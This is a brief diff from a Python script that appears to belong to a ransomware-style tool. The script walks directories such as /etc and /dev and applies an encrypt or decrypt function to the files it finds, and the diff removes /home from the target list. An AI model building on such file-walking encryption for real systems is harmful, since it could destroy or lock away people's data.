@@ -51,7 +51,7 @@ def main():
         cryptoFn = crypt.decrypt
 
         init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))
-        startDirs = [init_path, '/home', '/dev', '/etc']
+        startDirs = [init_path, '/dev', '/etc']
 
         for currentDir in startDirs:
             for filename in Discovery.discover(currentDir):
